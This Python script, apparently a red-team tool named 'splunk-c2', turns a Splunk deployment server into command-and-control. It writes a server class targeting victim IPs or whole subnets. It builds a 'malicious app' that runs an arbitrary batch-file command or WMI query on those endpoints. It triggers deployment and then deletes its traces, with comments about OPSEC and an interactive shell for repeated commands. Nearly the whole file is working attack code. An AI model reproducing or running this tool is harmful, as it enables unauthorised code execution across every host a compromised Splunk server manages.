import os
import tempfile
import shutil
import tarfile
import requests
import time
import argparse
from cmd import Cmd

# Disable invalid cert errors (used for testing)
requests.packages.urllib3.disable_warnings(
    category=requests.packages.urllib3.exceptions.InsecureRequestWarning)



# GLOBAL VARS
SPLUNK_APP_NAME = 'Splunk-C2-App' # OPSEC: Will be written to target systems
SPLUNK_SERVER_CLASS = "Splunk-as-C2" # Written to splunk server. Holds "clients" in groups.
TMP_PATH = "/opt/splunk/etc/deployment-apps"
SERVER_CLASS = "/opt/splunk/etc/system/local/serverclass.conf"
SPLUNK_FULL_PATH = TMP_PATH + "/" + SPLUNK_APP_NAME 

if os.path.exists(SPLUNK_FULL_PATH):
    shutil.rmtree(SPLUNK_FULL_PATH)
    print("[!] Removing existing Deployment app")

# Create a new server class and assign deployment client :) 
def create_server_class(options):
    if os.path.exists(SERVER_CLASS):
        os.remove(SERVER_CLASS)
    #os.system("/opt/splunk/bin/splunk reload deploy-server -auth {}:{}".format(options.username, options.password))
    with open(SERVER_CLASS, "w") as f:
        inputs = '[serverClass:{}]\n'.format(SPLUNK_SERVER_CLASS)
        inputs += 'whitelist.0 = {}\n'.format(options.victim)
        inputs += '\n'
        inputs += '[serverClass:{}:app:{}]\n'.format(SPLUNK_SERVER_CLASS, SPLUNK_APP_NAME)
        inputs += 'restartSplunkWeb = 0\n'
        inputs += 'restartSplunkd = true\n'
        inputs += 'stateOnClient = enabled\n'
        f.write(inputs)
    
    # print("create_server_class")
    # input()

# Creates malicious app. OPSEC: This is deployed to target endpoint.
def create_splunk_app(options, is_wmi):
    os.mkdir(os.path.join(TMP_PATH, SPLUNK_APP_NAME))

    bin_dir = os.path.join(TMP_PATH, SPLUNK_APP_NAME, "bin")
    os.mkdir(bin_dir)
    pwn_file = os.path.join(bin_dir, options.file)
    open(pwn_file, "w").write(options.command)

    local_dir = os.path.join(TMP_PATH, SPLUNK_APP_NAME, "local")
    os.mkdir(local_dir)

    # Malicious app with splunk-wmi.exe execution
    # TO DO: Don't copy baseline wmi.conf and generate is dynamically via the module chosen by the user
    if is_wmi:
        exec_command = "cp $PWD/templates/wmi.conf /opt/splunk/etc/deployment-apps/" + SPLUNK_APP_NAME + "/local/wmi.conf"
        os.system(exec_command)
        (fd, tmp_bundle) = tempfile.mkstemp(suffix='.tar')
        os.close(fd)
        with tarfile.TarFile(tmp_bundle, mode="w") as tf:
            tf.add(os.path.join(TMP_PATH, SPLUNK_APP_NAME), arcname=SPLUNK_APP_NAME)

    # Create regular malicious app for .bat file execution
    else:
        inputs_conf = os.path.join(local_dir, "inputs.conf")
        with open(inputs_conf, "w") as f:
            inputs = '[script://$SPLUNK_HOME/etc/apps/{}/bin/{}]\n'.format(SPLUNK_APP_NAME, options.file)
            inputs += 'disabled = false\n'
            inputs += 'index = default\n'
            inputs += 'interval = 60.0\n'
            inputs += 'sourcetype = test\n'
            f.write(inputs)
        (fd, tmp_bundle) = tempfile.mkstemp(suffix='.tar')
        os.close(fd)
        with tarfile.TarFile(tmp_bundle, mode="w") as tf:
            tf.add(os.path.join(TMP_PATH, SPLUNK_APP_NAME), arcname=SPLUNK_APP_NAME)
    
# Compile needed functions
def compile_functions(options, command, is_wmi):

    if command:
        options.command = command

    # Initialize session with valid creds   
    s = requests.Session()
    s.auth = requests.auth.HTTPBasicAuth(options.username, options.password)
    s.verify = False

    # Adding Server Class ->  Client -> Malicious App)
    create_server_class(options)
    SPLUNK_BASE_DEPLOY = "{}://{}:{}/services/deployment/server/config/_reload".format(
        options.scheme, 
        options.server, 
        options.port
        )
    APP_CREATED = create_splunk_app(options, is_wmi)
    try:
        response = s.post(SPLUNK_BASE_DEPLOY)
        if response.status_code == 401:
            print("Authentication failure")
            print("")
            print(req.text)
            sys.exit(-1)
    except:
        print("Could not POST to Splunk server")

    # Allow time for server to exec the script and send output to server prior to removing
    time.sleep(22)

    # Clean-up
    os.remove(SERVER_CLASS)
    print(f'[+] Removing -> {TMP_PATH+"/"+SPLUNK_APP_NAME}')
    shutil.rmtree(TMP_PATH+"/"+SPLUNK_APP_NAME)
    try:
        response = s.post(SPLUNK_BASE_DEPLOY)
        # Sometimes you need to reload twice for it to work..
        response = s.post(SPLUNK_BASE_DEPLOY)
        if response.status_code == 401:
            print("Authentication failure")
            print("")
            print(req.text)
            sys.exit(-1)
    except:
        print("Could not POST to Splunk server")


if __name__ == '__main__':

    parser = argparse.ArgumentParser('python3 splunk-c2.py')
    parser.add_argument('--scheme', default="https", help="http or https")
    parser.add_argument('--victim', required=True, help="Do an entire /24 with 198.168.1.* or single IP")
    parser.add_argument('--port', default=8089, help="Splunk mgmt port")
    parser.add_argument('--server', default="198.18.6.105", help="Splunk Server")
    parser.add_argument('--username', default="admin", help="Splunk Server Management user")
    parser.add_argument('--password', default="password", help="Splunk Server Management password")
    parser.add_argument('--command', default="C:\windows\system32\whoami.exe", help="Command that will be embedded in batch file for execution")
    parser.add_argument('--file', default="c2-job.bat", help="Name of the batch file that will be executed on the victim host")
    parser.add_argument('--interactive', action='store_true', help="If you want to run multiple commands quickly!")
    options = parser.parse_args()

    if options.interactive:
        class Terminal(Cmd):
            prompt = 'Iscariot-Splunk => '
            intro = f'[+] Going interactive on: {options.victim}'
            
            def __init__(self):
                super().__init__()

            def do_shell(self, command):
                "\nExecute commands inside batch file.\nUsage: shell whoami\n"
                is_wmi = False
                compile_functions(options, command, is_wmi)
                print("[+] Command complete. Results in splunk UI.")

            def do_wmi_poc(self, command):
                "\nExecute WMI queries via splunk-wmi.exe.\nUsage: wmi_poc\n"
                is_wmi = True
                compile_functions(options, command, is_wmi)
                print("[+] Command complete. Results in splunk UI.")

            def do_exit(self, command):
                "\nBye Felicia\n"
                print("Exiting...")
                quit()

        term = Terminal()
        term.cmdloop()

    else:
        print(f'[+] Exec: {options.command} on target -> {options.victim}')
        compile_functions(options, "", False)
        print("[+] Complete. Check your splunk UI :)")